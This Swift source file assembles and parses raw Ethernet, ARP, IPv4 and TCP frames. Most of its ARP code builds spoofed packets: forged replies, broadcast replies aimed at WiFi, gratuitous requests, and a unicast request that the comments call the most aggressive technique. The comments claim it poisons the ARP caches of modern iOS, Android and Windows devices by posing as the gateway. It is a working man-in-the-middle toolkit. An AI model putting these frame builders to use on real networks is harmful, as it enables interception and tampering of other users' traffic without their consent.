import Foundation

// MARK: - MAC address

/// A 6-byte MAC address. Stored as a fixed array for easy byte manipulation.
public struct MAC: Equatable, Hashable, Sendable {
    public var bytes: [UInt8]

    public init?(string: String) {
        let cleaned = string.replacingOccurrences(of: ":", with: "")
            .replacingOccurrences(of: "-", with: "")
        guard cleaned.count == 12,
              let bytes = [UInt8](hexString: cleaned) else { return nil }
        self.bytes = bytes
    }

    public init(_ bytes: [UInt8]) {
        precondition(bytes.count == 6)
        self.bytes = bytes
    }

    public static let broadcast = MAC([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
    public static let zero = MAC([0, 0, 0, 0, 0, 0])

    /// Formatted as aa:bb:cc:dd:ee:ff
    public var string: String {
        bytes.map { String(format: "%02x", $0) }.joined(separator: ":")
    }

    /// The 3-byte OUI prefix (first 3 bytes).
    public var ouiPrefix: String {
        String(format: "%02x-%02x-%02x", bytes[0], bytes[1], bytes[2]).uppercased()
    }
}

extension [UInt8] {
    /// Parse a hex string into bytes.
    init?(hexString: String) {
        guard hexString.count % 2 == 0 else { return nil }
        var result: [UInt8] = []
        var index = hexString.startIndex
        while index < hexString.endIndex {
            let next = hexString.index(index, offsetBy: 2)
            guard let byte = UInt8(hexString[index..<next], radix: 16) else { return nil }
            result.append(byte)
            index = next
        }
        self = result
    }
}

// MARK: - ARP frame assembly

/// Ethernet frame types.
public enum EtherType: UInt16, Sendable {
    case ipv4 = 0x0800
    case arp = 0x0806
    case ipv6 = 0x86DD
}

/// ARP operation codes.
public enum ARPOperation: UInt16, Sendable {
    case request = 1
    case reply = 2
}

/// Assemble an ARP request frame (Ethernet + ARP) for broadcast.
/// Pure function — testable without sockets or pcap.
public enum ARPFrame {
    /// Build an ARP request packet targeting `targetIP`.
    /// - Parameters:
    ///   - senderMAC: our MAC address
    ///   - senderIP: our IPv4 address (4 bytes)
    ///   - targetIP: the IPv4 address to resolve (4 bytes)
    /// - Returns: 42 bytes of Ethernet+ARP frame (no padding)
    public static func request(senderMAC: MAC, senderIP: [UInt8], targetIP: [UInt8]) -> [UInt8] {
        precondition(senderIP.count == 4 && targetIP.count == 4)

        var frame: [UInt8] = []

        // Ethernet header (14 bytes)
        frame += MAC.broadcast.bytes          // dst: broadcast
        frame += senderMAC.bytes              // src: our MAC
        frame += [0x08, 0x06]                 // ethertype: ARP

        // ARP header (28 bytes)
        frame += [0x00, 0x01]                 // htype: Ethernet
        frame += [0x08, 0x00]                 // ptype: IPv4
        frame += [0x06]                       // hlen: 6
        frame += [0x04]                       // plen: 4
        frame += [0x00, 0x01]                 // oper: request
        frame += senderMAC.bytes              // sha: sender MAC
        frame += senderIP                     // spa: sender IP
        frame += MAC.zero.bytes               // tha: target MAC (unknown)
        frame += targetIP                     // tpa: target IP

        return frame
    }

    /// Build an ARP reply packet (for spoofing — step 4).
    /// Padded to 60 bytes (minimum Ethernet frame size without FCS).
    public static func reply(senderMAC: MAC, senderIP: [UInt8],
                             targetMAC: MAC, targetIP: [UInt8]) -> [UInt8] {
        precondition(senderIP.count == 4 && targetIP.count == 4)

        var frame: [UInt8] = []

        // Ethernet header
        frame += targetMAC.bytes              // dst: target
        frame += senderMAC.bytes              // src: our MAC
        frame += [0x08, 0x06]                 // ethertype: ARP

        // ARP header
        frame += [0x00, 0x01]                 // htype: Ethernet
        frame += [0x08, 0x00]                 // ptype: IPv4
        frame += [0x06]                       // hlen: 6
        frame += [0x04]                       // plen: 4
        frame += [0x00, 0x02]                 // oper: reply
        frame += senderMAC.bytes              // sha: sender MAC (spoofed)
        frame += senderIP                     // spa: sender IP (spoofed)
        frame += targetMAC.bytes              // tha: target MAC
        frame += targetIP                     // tpa: target IP

        // Pad to 60 bytes (minimum Ethernet frame without FCS)
        while frame.count < 60 {
            frame.append(0x00)
        }

        return frame
    }

    /// Build a broadcast ARP reply (for WiFi where AP may filter unicast).
    /// Same as reply() but dst MAC is broadcast — maximizes delivery on WiFi.
    public static func replyBroadcast(senderMAC: MAC, senderIP: [UInt8],
                                       targetMAC: MAC, targetIP: [UInt8]) -> [UInt8] {
        precondition(senderIP.count == 4 && targetIP.count == 4)

        var frame: [UInt8] = []

        // Ethernet header — broadcast instead of unicast
        frame += MAC.broadcast.bytes          // dst: broadcast
        frame += senderMAC.bytes              // src: our MAC
        frame += [0x08, 0x06]                 // ethertype: ARP

        // ARP header
        frame += [0x00, 0x01]                 // htype: Ethernet
        frame += [0x08, 0x00]                 // ptype: IPv4
        frame += [0x06]                       // hlen: 6
        frame += [0x04]                       // plen: 4
        frame += [0x00, 0x02]                 // oper: reply
        frame += senderMAC.bytes              // sha: sender MAC (spoofed)
        frame += senderIP                     // spa: sender IP (spoofed)
        frame += targetMAC.bytes              // tha: target MAC
        frame += targetIP                     // tpa: target IP

        // Pad to 60 bytes
        while frame.count < 60 {
            frame.append(0x00)
        }

        return frame
    }

    /// Build a gratuitous ARP request (for spoofing — some devices accept
    /// requests but not replies). Padded to 60 bytes.
    public static func gratuitousRequest(senderMAC: MAC, senderIP: [UInt8]) -> [UInt8] {
        precondition(senderIP.count == 4)

        var frame: [UInt8] = []

        // Ethernet header — broadcast
        frame += MAC.broadcast.bytes          // dst: broadcast
        frame += senderMAC.bytes              // src: our MAC
        frame += [0x08, 0x06]                 // ethertype: ARP

        // ARP header — request, sender IP == target IP (gratuitous)
        frame += [0x00, 0x01]                 // htype: Ethernet
        frame += [0x08, 0x00]                 // ptype: IPv4
        frame += [0x06]                       // hlen: 6
        frame += [0x04]                       // plen: 4
        frame += [0x00, 0x01]                 // oper: request
        frame += senderMAC.bytes              // sha: sender MAC (spoofed)
        frame += senderIP                     // spa: sender IP (spoofed)
        frame += MAC.zero.bytes               // tha: zero
        frame += senderIP                     // tpa: same as spa (gratuitous)

        // Pad to 60 bytes
        while frame.count < 60 {
            frame.append(0x00)
        }

        return frame
    }

    /// Build a UNICAST ARP request — the most aggressive spoofing technique.
    /// Modern devices (iOS 14+, Android 10+, Windows 10+) ignore unsolicited
    /// ARP REPLIES but they DO cache the sender info from ARP REQUESTS.
    /// By sending a request FROM the spoofed gateway IP, the target caches
    /// "gateway IP -> our MAC" even with ARP cache protection enabled.
    public static func requestUnicast(senderMAC: MAC, senderIP: [UInt8],
                                       targetMAC: MAC, targetIP: [UInt8]) -> [UInt8] {
        precondition(senderIP.count == 4 && targetIP.count == 4)

        var frame: [UInt8] = []

        // Ethernet header — UNICAST to target (not broadcast)
        frame += targetMAC.bytes              // dst: target MAC (unicast)
        frame += senderMAC.bytes              // src: our MAC (spoofed)
        frame += [0x08, 0x06]                 // ethertype: ARP

        // ARP header — REQUEST (not reply!)
        frame += [0x00, 0x01]                 // htype: Ethernet
        frame += [0x08, 0x00]                 // ptype: IPv4
        frame += [0x06]                       // hlen: 6
        frame += [0x04]                       // plen: 4
        frame += [0x00, 0x01]                 // oper: REQUEST (key: request, not reply)
        frame += senderMAC.bytes              // sha: sender MAC (spoofed — our MAC)
        frame += senderIP                     // spa: sender IP (spoofed — gateway IP)
        frame += targetMAC.bytes              // tha: target MAC (known)
        frame += targetIP                     // tpa: target IP (known)

        // Pad to 60 bytes
        while frame.count < 60 { frame.append(0x00) }
        return frame
    }
}

// MARK: - Packet decode

/// A decoded Ethernet frame.
public struct EthernetFrame: Equatable {
    public let dstMAC: MAC
    public let srcMAC: MAC
    public let etherType: UInt16
    public let payload: [UInt8]

    /// Decode an Ethernet frame from raw bytes. Returns nil if too short.
    public static func decode(_ bytes: [UInt8]) -> EthernetFrame? {
        guard bytes.count >= 14 else { return nil }
        let dst = MAC(Array(bytes[0..<6]))
        let src = MAC(Array(bytes[6..<12]))
        let etherType = (UInt16(bytes[12]) << 8) | UInt16(bytes[13])
        let payload = Array(bytes[14...])
        return EthernetFrame(dstMAC: dst, srcMAC: src, etherType: etherType, payload: payload)
    }
}

/// A decoded ARP packet (payload of an Ethernet frame with etherType 0x0806).
public struct ARPPacket: Equatable {
    public let operation: ARPOperation
    public let senderMAC: MAC
    public let senderIP: [UInt8]   // 4 bytes
    public let targetMAC: MAC
    public let targetIP: [UInt8]   // 4 bytes

    /// Decode an ARP packet from the Ethernet payload. Returns nil if invalid.
    public static func decode(_ bytes: [UInt8]) -> ARPPacket? {
        guard bytes.count >= 28 else { return nil }
        guard let op = ARPOperation(rawValue: (UInt16(bytes[6]) << 8) | UInt16(bytes[7])) else { return nil }
        let senderMAC = MAC(Array(bytes[8..<14]))
        let senderIP = Array(bytes[14..<18])
        let targetMAC = MAC(Array(bytes[18..<24]))
        let targetIP = Array(bytes[24..<28])
        return ARPPacket(operation: op, senderMAC: senderMAC, senderIP: senderIP,
                         targetMAC: targetMAC, targetIP: targetIP)
    }

    /// Sender IP as a dotted string.
    public var senderIPString: String { senderIP.map(String.init).joined(separator: ".") }
    /// Target IP as a dotted string.
    public var targetIPString: String { targetIP.map(String.init).joined(separator: ".") }
}

/// A decoded IPv4 header.
public struct IPv4Header: Equatable {
    public let version: UInt8
    public let headerLength: Int       // in bytes
    public let protocolNumber: UInt8
    public let sourceIP: [UInt8]
    public let destIP: [UInt8]
    public let totalLength: Int
    public let payload: [UInt8]

    public static func decode(_ bytes: [UInt8]) -> IPv4Header? {
        guard bytes.count >= 20 else { return nil }
        let version = (bytes[0] >> 4) & 0x0F
        guard version == 4 else { return nil }
        let ihl = Int(bytes[0] & 0x0F) * 4
        guard bytes.count >= ihl else { return nil }
        let totalLength = (Int(bytes[2]) << 8) | Int(bytes[3])
        let proto = bytes[9]
        let src = Array(bytes[12..<16])
        let dst = Array(bytes[16..<20])
        let payload = Array(bytes[ihl..<min(bytes.count, totalLength)])
        return IPv4Header(version: version, headerLength: ihl, protocolNumber: proto,
                          sourceIP: src, destIP: dst, totalLength: totalLength, payload: payload)
    }

    public var sourceIPString: String { sourceIP.map(String.init).joined(separator: ".") }
    public var destIPString: String { destIP.map(String.init).joined(separator: ".") }
}

/// A decoded TCP header (minimal — enough for port extraction).
public struct TCPHeader: Equatable {
    public let sourcePort: UInt16
    public let destPort: UInt16
    public let flags: UInt8
    public let payload: [UInt8]

    public static func decode(_ bytes: [UInt8]) -> TCPHeader? {
        guard bytes.count >= 20 else { return nil }
        let srcPort = (UInt16(bytes[0]) << 8) | UInt16(bytes[1])
        let dstPort = (UInt16(bytes[2]) << 8) | UInt16(bytes[3])
        let dataOffset = Int((bytes[12] >> 4) & 0x0F) * 4
        guard bytes.count >= dataOffset else { return nil }
        let flags = bytes[13]
        let payload = Array(bytes[dataOffset...])
        return TCPHeader(sourcePort: srcPort, destPort: dstPort, flags: flags, payload: payload)
    }

    public var isSYN: Bool { flags & 0x02 != 0 }
    public var isACK: Bool { flags & 0x10 != 0 }
    public var isFIN: Bool { flags & 0x01 != 0 }
    public var isRST: Bool { flags & 0x04 != 0 }
}

/// IP protocol numbers.
public enum IPProtocol: UInt8, Sendable {
    case icmp = 1
    case tcp = 6
    case udp = 17
}
